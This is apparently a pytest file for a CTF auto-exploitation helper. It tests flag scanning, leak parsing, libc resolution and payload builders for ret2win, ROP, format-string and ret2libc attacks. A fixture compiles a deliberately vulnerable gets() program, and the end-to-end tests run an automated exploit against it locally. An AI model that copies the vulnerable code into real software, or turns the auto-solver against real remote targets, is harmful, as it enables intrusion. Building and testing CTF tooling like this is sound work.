"""Tests for kraken.helpers.auto_pwn_interact -- interactive remote-pwn loop.

Two layers:
  * Pure-logic tests (flag scanning, leak parsing, libc resolution, payload
    construction, the Action/Observation step API) -- always run.
  * A compiled-binary exploit test (ret2win over a local process) -- runs only
    when gcc + pwntools are available; skipped otherwise.
"""

from __future__ import annotations

import os
import shutil
import subprocess
import tempfile

import pytest

from kraken.helpers import auto_pwn_interact as api

PWN = api.PWNTOOLS_AVAILABLE


# ── Flag scanning ──────────────────────────────────────────────────────────
class TestFlagScanning:
    def test_scan_with_format(self):
        flags = api.scan_flags("noise flag{abc_123} tail", r"flag\{[^}]+\}")
        assert "flag{abc_123}" in flags

    def test_scan_default_pattern(self):
        flags = api.scan_flags("here is CTF{deadbeef} ok")
        assert "CTF{deadbeef}" in flags

    def test_scan_dedup_preserves_order(self):
        flags = api.scan_flags("flag{a} flag{b} flag{a}", r"flag\{[^}]+\}")
        assert flags == ["flag{a}", "flag{b}"]

    def test_best_flag_prefers_longest_real(self):
        assert api.best_flag(["flag{x}", "flag{a_longer_one}"]) == "flag{a_longer_one}"

    def test_best_flag_skips_placeholder(self):
        # A real flag should win over an obvious placeholder even if shorter.
        assert api.best_flag(["flag{example}", "flag{r}"]) == "flag{r}"

    def test_best_flag_none_when_empty(self):
        assert api.best_flag([]) is None

    def test_scan_invalid_regex_falls_back_to_prefix(self):
        # An unbalanced/invalid regex must not raise; it degrades to a prefix.
        flags = api.scan_flags("see flag{real_value} done", "flag{")
        assert "flag{real_value}" in flags


# ── Leak / address parsing ──────────────────────────────────────────────────
class TestLeakParsing:
    def test_parse_hex_literal(self):
        assert api.parse_leak("puts @ 0x7ffff7a52970") == 0x7FFFF7A52970

    def test_parse_raw_little_endian_64(self):
        raw = (0x7FFFF7A52970).to_bytes(8, "little")
        assert api.parse_leak(raw, bits=64) == 0x7FFFF7A52970

    def test_parse_raw_little_endian_with_leading_newline(self):
        raw = b"\n" + (0x55AABBCCDD00).to_bytes(8, "little")
        assert api.parse_leak(raw, bits=64) == 0x55AABBCCDD00

    def test_parse_32bit(self):
        raw = (0x804A010).to_bytes(4, "little")
        assert api.parse_leak(raw, bits=32) == 0x804A010

    def test_parse_rejects_garbage(self):
        assert api.parse_leak(b"\x00\x00", bits=64) is None

    def test_leak_address_alias(self):
        assert api.leak_address("addr=0xdeadbeef00") == 0xDEADBEEF00


# ── libc resolution (reuses auto_libc_lookup DB) ────────────────────────────
class TestLibcResolution:
    def test_resolve_from_db_puts_glibc_231(self):
        # glibc 2.31 amd64 puts offset is 0x80970; pick a page-aligned base.
        base = 0x7FFFF7A00000
        leaked = base + 0x80970
        res = api.resolve_libc("puts", leaked, arch="amd64")
        assert res is not None
        assert res.base == base
        # system/binsh must resolve to absolute addresses above the base.
        assert res.system is not None and res.system > base
        assert res.binsh is not None and res.binsh > base

    def test_resolve_returns_none_on_unaligned(self):
        # A leak that doesn't align to any known offset yields no match.
        res = api.resolve_libc("puts", 0x12345, arch="amd64")
        assert res is None

    def test_one_gadget_addrs_offset_from_base(self):
        base = 0x7FFFF7A00000
        leaked = base + 0x80970  # glibc 2.31
        res = api.resolve_libc("puts", leaked, arch="amd64")
        assert res is not None
        gadgets = res.one_gadget_addrs()
        # All one_gadget absolute addresses sit above the libc base.
        assert all(g > base for g in gadgets)


# ── StageBuilder payload construction ───────────────────────────────────────
@pytest.fixture(scope="module")
def ret2win_binary():
    """Compile a tiny ret2win binary; skip if gcc/pwntools unavailable."""
    if not PWN or shutil.which("gcc") is None:
        pytest.skip("gcc + pwntools required for binary-backed tests")
    d = tempfile.mkdtemp(prefix="kraken_pwn_test_")
    src = os.path.join(d, "vuln.c")
    binp = os.path.join(d, "vuln")
    flag = os.path.join(d, "flag.txt")
    with open(src, "w") as f:
        f.write(
            "#include <stdio.h>\n#include <stdlib.h>\n"
            'void win(void){ system("cat flag.txt 2>/dev/null"); fflush(stdout);} \n'
            'void vuln(void){ char b[64]; puts("Enter your name:"); fflush(stdout);'
            ' gets(b); printf("Hello, %s!\\n", b); fflush(stdout);} \n'
            "int main(void){ setvbuf(stdout,0,_IONBF,0); setvbuf(stdin,0,_IONBF,0);"
            " vuln(); return 0;}\n"
        )
    with open(flag, "w") as f:
        f.write("flag{unit_test_ret2win}\n")
    rc = subprocess.run(
        ["gcc", "-fno-stack-protector", "-no-pie", "-o", binp, src],
        capture_output=True,
    )
    if rc.returncode != 0 or not os.path.exists(binp):
        shutil.rmtree(d, ignore_errors=True)
        pytest.skip(f"could not compile ret2win binary: {rc.stderr.decode()[:200]}")
    yield binp, flag, d
    shutil.rmtree(d, ignore_errors=True)


class TestStageBuilder:
    def test_offset_detected_from_source(self, ret2win_binary):
        binp, _flag, d = ret2win_binary
        src = os.path.join(d, "vuln.c")
        b = api.StageBuilder(binp, source=src)
        # 64-byte buffer -> offset is 72 on aarch64, 72 on x86-64 too here.
        assert b.find_offset() is not None
        assert b.find_offset() >= 64

    def test_resolve_win_by_symbol(self, ret2win_binary):
        binp, _flag, _d = ret2win_binary
        b = api.StageBuilder(binp)
        addr = b.resolve_win("win")
        assert isinstance(addr, int) and addr > 0

    def test_resolve_win_autodetect(self, ret2win_binary):
        binp, _flag, _d = ret2win_binary
        b = api.StageBuilder(binp)
        assert isinstance(b.resolve_win(None), int)

    def test_resolve_win_by_hex(self, ret2win_binary):
        binp, _flag, _d = ret2win_binary
        b = api.StageBuilder(binp)
        assert b.resolve_win("0x400868") == 0x400868

    def test_build_ret2win_payload_shape(self, ret2win_binary):
        binp, _flag, _d = ret2win_binary
        b = api.StageBuilder(binp)
        off = b.find_offset()
        win = b.resolve_win("win")
        payload = b.build_ret2win("win")
        assert payload is not None
        # On non-x86 there is no stack-align ret, so the payload is exactly
        # padding + the win address (one word).
        if not b.is_x86:
            assert len(payload) == off + b.word
            assert payload == b"A" * off + b._pack(win)
        else:
            # x86-64 may insert one alignment ret -> padding + [ret] + win.
            assert len(payload) in (off + b.word, off + 2 * b.word)

    def test_build_rop_chain(self, ret2win_binary):
        binp, _flag, _d = ret2win_binary
        b = api.StageBuilder(binp)
        off = b.find_offset()
        payload = b.build_rop([0x401234, 0x401238])
        assert payload == b"A" * off + b._pack(0x401234) + b._pack(0x401238)

    def test_build_format_string_single_and_scan(self, ret2win_binary):
        binp, _flag, _d = ret2win_binary
        b = api.StageBuilder(binp)
        assert b.build_format_string(offset=6) == b"%6$p"
        scan = b.build_format_string(count=5)
        assert scan.count(b"$p") == 5

    def test_build_ret2libc_none_without_libc_match(self, ret2win_binary):
        binp, _flag, _d = ret2win_binary
        b = api.StageBuilder(binp)
        # A bogus libc resolution with no symbols -> cannot build.
        fake = api.LibcResolution(base=0x1000, version="x", libc_id="x", symbols={}, one_gadgets=[])
        assert b.build_ret2libc(fake) is None


# ── Full interactive exploit (local process) ────────────────────────────────
class TestLocalExploit:
    """End-to-end: drive auto_solve against a real compiled ret2win binary."""

    def test_auto_solve_pops_flag_local(self, ret2win_binary):
        binp, _flag, d = ret2win_binary
        src = os.path.join(d, "vuln.c")
        conn = api.PwnConnection.open_local(binp)
        try:
            flag, session = api.auto_solve(
                conn,
                binary=binp,
                source=src,
                win_addr="win",
                flag_format=r"flag\{[^}]+\}",
            )
        finally:
            conn.close()
        assert flag == "flag{unit_test_ret2win}"
        # The session must expose the full transcript for the agent.
        assert ">>>" in session.conn.transcript_text()

    def test_run_cli_contract_local(self, ret2win_binary):
        """run() against the local binary returns found=True with the flag."""
        binp, _flag, d = ret2win_binary
        src = os.path.join(d, "vuln.c")
        results = api.run(binp, source=src, win_addr="win", flag_format=r"flag\{[^}]+\}")
        assert results[0]["found"] is True
        assert results[0]["flag"] == "flag{unit_test_ret2win}"

    def test_step_api_drives_ret2win(self, ret2win_binary):
        """The observe->decide->act step() API can drive the exploit."""
        binp, _flag, d = ret2win_binary
        src = os.path.join(d, "vuln.c")
        conn = api.PwnConnection.open_local(binp)
        sess = api.InteractiveSession(
            conn,
            binary=binp,
            source=src,
            flag_format=r"flag\{[^}]+\}",
        )
        # Prime the builder + read the prompt.
        sess.builder()
        sess.recv(timeout=1.0)

        def decide(obs: api.Observation) -> api.Action | None:
            # On seeing the name prompt, fire ret2win; otherwise finish.
            if obs.contains("name") and sess.flag is None:
                return api.Action.ret2win("win")
            return api.Action.finish()

        try:
            flag = sess.run_loop(decide, max_steps=6)
        finally:
            conn.close()
        assert flag == "flag{unit_test_ret2win}"


# ── Action / Observation step API ───────────────────────────────────────────
class TestActionApi:
    def test_action_constructors(self):
        assert api.Action.sendline(b"x").kind == "sendline"
        assert api.Action.ret2win("win").payload == "win"
        assert api.Action.rop([1, 2]).payload == [1, 2]
        assert api.Action.finish().done is True
        assert api.Action.ret2libc().kind == "ret2libc"

    def test_custom_action_runs_fn(self):
        calls = []
        act = api.Action.custom(lambda s: calls.append(s), done=True)
        # apply() should invoke the fn with the session argument.
        act.apply(session=_DummySession())  # type: ignore[arg-type]
        assert len(calls) == 1
        assert act.done is True


class _DummySession:
    """Minimal stand-in so Action.apply('custom') can be unit-tested."""

    def send(self, *a, **k):
        pass

    def sendline(self, *a, **k):
        pass


# ── run() helper-convention contract ────────────────────────────────────────
class TestRunContract:
    def test_run_returns_list_of_one_dict(self):
        # Connecting to a closed port returns a single result dict with the
        # standard keys and found=False (graceful, no exception).
        results = api.run("127.0.0.1:1", remote=True, flag_format=r"flag\{[^}]+\}")
        assert isinstance(results, list) and len(results) == 1
        r = results[0]
        assert set(["flag", "found", "target", "transcript", "stages"]).issubset(r)
        assert r["found"] is False
        assert r["target"] == "127.0.0.1:1"

    def test_run_missing_binary_graceful(self):
        results = api.run("/nonexistent/binary/path/xyz")
        assert results[0]["found"] is False
